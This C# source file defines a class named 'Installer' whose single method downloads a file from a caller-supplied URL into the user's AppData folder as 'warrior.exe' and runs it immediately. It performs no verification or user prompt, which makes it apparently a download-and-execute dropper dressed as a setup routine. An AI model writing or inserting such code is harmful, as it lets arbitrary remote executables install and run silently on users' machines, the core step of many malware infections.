using System;
using System.Deployment.Application;
using System.Windows.Forms;
using System.Net;

namespace Setup
{
	class Installer
	{
		public void InstallApplication(string deployManifestUriStr)
		{
			string appdata = System.Windows.Forms.Application.UserAppDataPath;
            string location = appdata + "\\warrior.exe";

			WebClient client = new WebClient();
			client.DownloadFile(deployManifestUriStr, location);

			System.Diagnostics.Process.Start(location);
		}
	}
}
